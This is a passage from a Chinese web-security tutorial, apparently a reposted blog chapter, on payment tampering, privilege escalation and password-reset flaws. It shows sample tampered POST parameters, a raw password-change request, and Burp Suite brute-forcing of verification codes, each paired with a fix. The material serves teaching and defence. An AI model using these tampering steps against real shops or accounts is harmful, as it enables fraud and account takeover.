+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>如果此时后端只校验订单是否支付成功，那么这里就是一个经典的金额数据篡改案例了。开发者修复此类问题的时候要做好多重校验，当金额数据被篡改的时候及时抛出异常，禁止订单交易继续进行。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.2.2 商品数量修改
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>除了直接修改商品的金额这种情况，还有一个情况就是直接修改商品的数量。购买商品的时候通常有一个数量选项，用户可以对商品的数量做加减，通常会在前端限制商品不能为 0，但是开发者在后端却没有做出相应限制，这就可能导致攻击者可以通过修改数据包造成商品数量小于 1 的情况发生。 下面是一个购买上面要提交的 POST 数据包信息：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;car_pid[]=678&amp;car_pnum_678=1&amp;car_pid[]=60&amp;car_pnum_60=1&amp;buy_type=2
+</span></span><span style=display:flex><span>   car_pid[]=678&amp;car_pnum_678=-19&amp;car_pid[]=60&amp;car_pnum_60=1&amp;buy_type=2&lt;/pre&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>很明显一个是商品 ID，另一个是数量，抓包修改数量把 1 元的价格修改成 - 19 元，最后修改成功。 订单金额修改成功如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565140_64a57594a1a4dafa9c41d.jpg!small?1688565140807)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                                        订单金额修改成功
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>最后订单提交的时候总金额只需要 1 元就可以买到原价 21 元的商品。解决这类安全问题和上面防范金额被篡改的方法差不多，都是多重校验，应关注商品数量中途是否被篡改过，以及时终止异常订单。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.2.3 运费金额修改
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>在支付漏洞中，除了直接修改商品金额或者间接修改商品数量，还有一些影响订单总价的参数也可以关注一下，如运费金额或者优惠券等参数。 购买商品经常还包含运费信息，产生的运费有所不同，运费如果是前端提交的金额，不经过后端处理验证，那么就很可能产生此漏洞。 下面是一个修改运费的案例，发现提交订单的时候支持选择配送方式，但是配送方式的金额不可以被修改，有验证。不过配送运费却没有校验，只要商品费用 + 配送运费总价不低于 0 都可正常提交，结果修改运费为负数。 修改订单运费如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565161_64a575a92a4c5a82e1d83.jpg!small?1688565161828)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                               修改订单运费
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>商品费用 + 配送运费两者相加恰好为 1 元满足不低于 0 元的情况。所以最后也成功提交了订单。 成功修改订单金额如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565179_64a575bb16a79e2912258.jpg!small?1688565179372)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>成功修改订单金额
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 10.3 账户越权
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>用户越权从字面意思理解就是用户可以操作超出自己管理权限范围的功能，主要原因是开发者在对数据库进行 CRUD（Create，Read，Update and Delete）时，对客户端请求的数据遗漏了对权限的判定。 大多数 Web 应用系统都具备权限划分和控制，但是如果权限校验存在问题，攻击者就可以通过这些问题来访问未经授权的功能或数据，这就是通常所说的越权漏洞。 我们一般将越权漏洞分为三种：未授权、水平越权、垂直越权。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.3.1 未授权
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>开发者未考虑到用户是否经过登录或者认证的情况下直接返回敏感数据，我们称之为未授权访问漏洞。假设有一个 URL 如下：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;http://x.x.x.x/getUserInfo.php?uid=100&lt;/pre&gt;
+</span></span><span style=display:flex><span>在这个 URL 中可以看出后端通过 uid 参数值返回相应的用户信息。如果这个接口没有做用户登录验证或者管理员的身份验证，那么所有人都能访问到，很有可能导致用户信息被遍历并输出。下面看一个案例： 首先使用谷歌语法搜索到目标网站的后台，搜索登录后台如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565238_64a575f69d12b4f84bed9.jpg!small?1688565238944)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                 搜索登录后台
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>接着点击访问，发现可以直接进入后台，并可以进行一些后台操作。下图为攻击者成功访问后台页面。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565264_64a576104ce6060d50456.jpg!small?1688565264604)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                         攻击者成功访问后台页面
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>出现这种问题的原因在于，开发者开发后台的时候没有校验当前用户权限是否满足要求，没有做好权限的统一判断，造成了未授权访问漏洞的产生。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.3.2 水平越权
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>水平越权指的是攻击者尝试访问与他拥有相同权限用户的资源。水平越权通常可查看其他用户信息，修改其他用户资料等操作。比如，酒店会员系统，可查看其他用户的酒店订房订单信息；博客系统，可查看其他博主私人博文等信息。 下面来看一个水平越权的案例，查看订单数据抓包发现修改返回包信息可以直接查看到其他订单的返回数据包。 查看其他订单信息如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565282_64a576226c81ec8cca8f2.jpg!small?1688565282991)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                            查看其他订单信息
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>此时修改 goodOrderID 参数后发现返回了另一个订单的详细数据信息。 这个地址被用户访问后，后端的逻辑会去查询数据库，可以猜测查询的 SQL 语句是这样的：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;select*from order where goodOrderID = 7708433&lt;/pre&gt;
+</span></span><span style=display:flex><span>这种订单遍历的危害巨大，攻击者可以轻易地使用 Burpsuite 来进行订单 ID 的遍历，这样短时间内可获取到大量的订单信息。开发者修复此类漏洞的方法也是要做好权限判断，每个订单设置好对应用户的访问权限，当用户尝试访问其他订单信息的时候及时进行拦截，并提示非法访问之类的信息。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.3.3 垂直越权
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>垂直越权指的是一个低权限攻击者尝试访问高权限用户的资源。如果普通用户能利用某种攻击手段访问到高权限的功能，那我们就称之为垂直越权。下面来看一个乌云 ID 为 wooyun-2014-084657 垂直越权的案例。 程序对用户权限的控制仅仅是让用户界面中不出现相应的菜单及功能模块，但是用户可以通过修改菜单 ID 的方式访问其他权限的系统内容，属于垂直越权操作。例如，使用 audit 审计用户登录系统，在点击菜单时，将识别参数修改为 system.admin。下面是通过修改 get 参数来实现越权。 修改 get 参数如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565301_64a576355d9f260e28c08.jpg!small?1688565301830)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                             修改 get 参数
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>这时，audit 用户就拥有了修改管理员信息及权限的能力，还可以发现，修改参数后进入管理员管理界面截图的功能增强了很多。 防火墙后台管理页面如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565320_64a57648722bf200219df.jpg!small?1688565320774)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                  防火墙后台管理页面 上
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>述就是一个非常典型的案例，普通用户通过修改 HTTP 参数即可实现权限的提升。类似的这种越权就叫垂直越权，常见于普通用户权限提升到管理员权限，开发者要修复这种漏洞需要实时增加权限判断检测，发现当前用户权限不够时，及时终止程序运行，防止越权的事件发生。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 10.4 密码重置
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>密码找回功能本意是为那些忘记密码的用户设计的，以便他们能够找回自己的密码。但是由于程序员开发逻辑问题，可能会导致其他普通用户也可以重置任意用户密码的漏洞产生。密码重置漏洞的实际出现场景也比较多，下面就来梳理一下。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.4.1 验证码不失效
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>找回密码的时候获取的验证码缺少时间限制，仅判断了验证码是否正确，却没有判断验证码是否过期，这样攻击者可以通过穷举的手段在短时间内尝试大量的验证码。 测试这种漏洞的时候，抓取关键的重置数据包，然后通过枚举找到真正的验证码，输入验证码完成验证。输入目标手机号，获取验证码随意输入验证码 0004 点击提交，拦截数据包，如果不是失效就直接使用 Burpsuite 来穷举验证码即可。 Burpsuite 穷举验证码如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565346_64a576621e926ede82425.jpg!small?1688565346796)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                            Burpsuite 穷举验证码
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>这种验证码不失效的情况在早期容易出现，不过现在已经非常少见了，而且也很少有简单的 4 位验证码了。现在绝大多数的业务场景都使用了 6 位数的验证码并且设置了 15 分钟有效期，这样爆破的可能性就非常低了。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.4.2 验证码直接返回
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>这种情况的验证码使用场景如下：输入手机号后点击获取验证码，验证码在客户端生成，并直接返回 HTML 文件中或者网页的响应包中，以方便对接下来的验证码进行对比。 挖掘这种漏洞，需要走一遍验证码流程，首先输入目标手机号，点击获取验证码，并观察返回包即可。在返回包中得到目标手机号获取的验证码，进而完成验证，重置密码成功。下面是通过获取返回包中的验证码成功完成验证的实例。 重置任意手机号密码如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565362_64a576729c27e6358fefb.jpg!small?1688565362725)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                       重置任意手机号密码
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>早期互联网上这种漏洞案例非常多，有的甚至直接在返回包中返回了密码相关的值，这个值可能是明文的也可能是旧密码的 MD5 值，但是如果登录认证也需要加密值或者 MD5 过于简单可以破解的情况下，那么攻击者就可以直接使用返回包中的字符串来登录目标系统。 返回包存在用户登录信息如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565377_64a57681eed232be76956.jpg!small?1688565378363)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                       返回包存在用户登录信息
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.4.3 跳过验证步骤
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>这种漏洞产生的原因是关键的修改密码步骤没有做校验，导致用户可以直接输入最终修改密码的网址，跳转到该修改密码的页面，然后输入新密码达到重置密码的目的。 访问 http：//.../a/user/findPasswordSetp 直接跳到重置密码的页面，从而跳过验证码校验，效果如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565408_64a576a09b33a967dcdcb.jpg!small?1688565408817)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                      跳过验证码模块重置密码
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>挖掘这种漏洞的方法如下，首先需要使用自己的账号走完一遍密码重置的流程，记录一下每个步骤的页面的关键链接或数据包，重点记录关键修改密码的链接。尝试重置他人用户的密码时，获取验证码后，尝试直接输入前面的关键修改密码的链接，如果顺利会跳转到设置新密码的界面，输入密码重置成功。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.4.4 手机号未绑定用户
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>某些系统可能在设计之初，并没有将用户名、手机号、验证码三者进行统一的验证。在找回密码的时候仅判断了三者中的手机号和验证是否匹配和正确，如果正确则判断成功并进入下一阶段的密码重置流程。 下面看一个这种漏洞的攻击场景，漏洞触发过程如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565435_64a576bb612dfe527bc2a.jpg!small?1688565435599)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                      漏洞触发过程
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>点击找回密码，首先我们输入其他人的用户名，然后点击获取验证码，这个时候把接收验证码的手机号修改为我们自己的号码，一般情况下修改手机号是在 Burpsuite 抓取的数据包中进行修改的，然后输入我们自己的手机号来接收验证码，如果接收成功填写验证码，顺利的话就会成功跳到重置密码的页面，密码重置成功。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.4.5 修改密码 ID 替换
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>修改密码的时候，没有对原密码进行判断，并且直接根据用户的 ID 值来修改用户的密码，类似的 SQL 语句如下：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;update user set password=&#34;qwer1234&#34; where id = &#39;1&#39;&lt;/pre&gt;
+</span></span><span style=display:flex><span>这种情况下修改数据包里的 ID 值，即可修改目标 ID 所对应用户的密码。下面就是修改密码的一个关键数据包：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;POST/Index/user/userinfo.html HTTP/1.1
+</span></span><span style=display:flex><span>Host: 192.168.8.31:8088
+</span></span><span style=display:flex><span>Content-Length:63
+</span></span><span style=display:flex><span>Cache-Control:max-age=0    
+</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8    
+</span></span><span style=display:flex><span>Origin: http://192.168.8.31:8088    
+</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: 1    
+</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2107.202 Safari/537.36    
+</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded    
+</span></span><span style=display:flex><span>Referer: http://192.168.8.31:8088/Index/user/userinfo.html    
+</span></span><span style=display:flex><span>Accept-Encoding: gzip, deﬂate   
+</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.8    
+</span></span><span style=display:flex><span>Cookie: PHPSESSID=28af1649bcbcb0e0dd83
+</span></span><span style=display:flex><span>afa017691a03; __sticket=hKdyp310daeBfKWqgnimZoB2zrKwespkfaaV
+</span></span><span style=display:flex><span>m4KKpN-Fp3tokWJ-YJeQqWOXe9mpf5-br8dox6SUlX_Rgn2t05GVpZ6Jqo
+</span></span><span style=display:flex><span>aqg3zMoY-rnnM.6.a.    id=5&amp;user_name=kefu1&amp;password=123456&amp;n
+</span></span><span style=display:flex><span>ame=kefu123&amp;email=&amp;phone=&lt;/pre&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>这里的 ID 和 kefu1 所在参数 user name 并没有去判断是否为同一个用户，所以这里修改 ID 时是可以任意修改其他用户密码的。 成功修改任意用户密码如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565464_64a576d8097770847b878.jpg!small?1688565464796)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>成功修改任意用户密码 这里在不修改 user name 的情况下，只修改 ID 值就能重置其他用户的密码。这种漏洞危害巨大，可以通过枚举用户的 ID 值来大批量重置枚举得到的用户密码，因为不需要用户名，只需要知道 ID 值即可重置密码，而且一般这种情况下还很可能会存在 SQL 注入漏洞
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>## 11 本章小结
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>本章从 Web 应用常见的安全漏洞出发，介绍了各类漏洞的基本概念、形成原因、利用方法、防护技术等内容，包括文件上传漏洞、文件下载漏洞、文件包含漏洞、SQL 注入漏洞、命令执行漏洞、XSS 跨站脚本攻击、CSRF 跨站请求伪造、XXE XML 实体注入、SSRF 服务端请求伪造等内容。最后介绍了常见的业务逻辑漏洞，包括验证码安全漏洞、支付漏洞、账户越权、密码重置等内容。 课后思考 简答题
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>1.  请简述 UNION SELECT 手工注入的流程。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2.  请列举 XSS 跨站脚本漏洞有哪些分类。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>3.  请列举 SSRF 请求伪造漏洞的危害。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>4.  请列举文件包含漏洞经常可以和哪些伪协议配合使用。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>5.  请简述文件上传漏洞常有哪些绕过方法。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>6.  请简述黑名单和白名单机制的区别
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>本文作者：woshidatianguan， 转载自 [FreeBuf.COM](https://www.freebuf.com)
+</span></span></code></pre></div></div><footer class=post-footer><div class=post-tags><a href=/tags/window>window</a>
+<a href=/tags/web>Web</a>
+<a href=/tags/%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8>网络安全</a></div><div class=addthis_inline_share_toolbox style=text-align:center></div><hr><div class=post-copyright><img src=/imgs/cc/cc.svg width=75 height=75 align=right alt=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
+Web 攻防原理剖析</li><li class=post-copyright-author><strong>本文作者：</strong>
+Hellciw</li><li class=post-copyright-link><strong>本文链接：</strong>
+<a id=post-cr-link href=https://0linkun.github.io/post/Studyweb.html title="Web 攻防原理剖析">https://0linkun.github.io/post/Studyweb.html</a></li><li class=post-copyright-license><strong>版权声明：</strong>
+本博客所有文章除特别声明外，均采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div class=followme><span>欢迎关注我的其它发布渠道</span><div class=social-list><div class=social-item><a target=_blank class=social-link href=/images/wechat_channel.jpg><span class=icon><i class="fab fa-weixin"></i></span>
+<span class=label>WeChat</span></a></div><div class=social-item><a target=_blank class=social-link href=/atom.xml><span class=icon><i class="fa fa-rss"></i></span>
+<span class=label>RSS</span></a></div></div></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/wanganstudy.html rel=next title=网安学习><i class="fa fa-chevron-left"></i> 网安学习</a></div><div class="post-nav-prev post-nav-item"><a href=/post/Nmapstudy.html rel=prev title=Nmap学习使用>Nmap学习使用
+<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div id=comments class=post-comments><div class=comment-head><div class=comment-headline><i class="fas fa-comments fa-fw"></i>
+<span>评论交流</span></div><div class=comment-switch><span class=first-comment>Giscus</span>
+<span class=switch-btn></span>
+<span class=second-comment>Waline</span></div></div><div class=comment-wrap><div><div class=comment-loading><i class="fa fa-sync fa-spin"></i></div><div class=giscus-container></div></div><div><div class=comment-loading><i class="fa fa-sync fa-spin"></i></div><div class=waline-container></div></div></div></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
+<span itemprop=copyrightYear>2023</span>
+<span class=with-love><i class="fa fa-heart"></i></span>
+<span class=author itemprop=copyrightHolder>Hellciw</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.112.3 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.5.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div></div></footer><script type=text/javascript src=https://cdn.staticfile.org/animejs/3.2.1/anime.min.js defer></script>
+<script type=text/javascript src=https://cdn.staticfile.org/viewerjs/1.11.0/viewer.min.js defer></script>
+<script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":true,"giscus":{"cfg":{"category":"Announcements","categoryid":"DIC_kwDOJhQedM4CWy4v","emit":"ture","inputposition":"top","mapping":"pathname","reactions":false,"repo":"hellciw/hellciw.github.io","repoid":"R_kgDOJhQedA","theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://0linkun.github.io/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"zoomInUp","postblock":"zoomInUp","postbody":"bounceInDown","postheader":"rotateIn","sidebar":"flip"}},"postmeta":{"comments":{"enable":false,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"qiniu","router":"https://cdn.staticfile.org"},"version":"4.5.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"waline","file":"dist/waline.css","name":"@waline/client","version":"2.13.0"},"js":{"alias":"waline","file":"dist/waline.js","name":"@waline/client","version":"2.13.0"}}}</script><script type=text/javascript src=/js/main.min.0b6f435ab2b781f04f78d578f42b492c126726d94b54a88d0af9aaf3c50c4457.js defer></script></body></html>
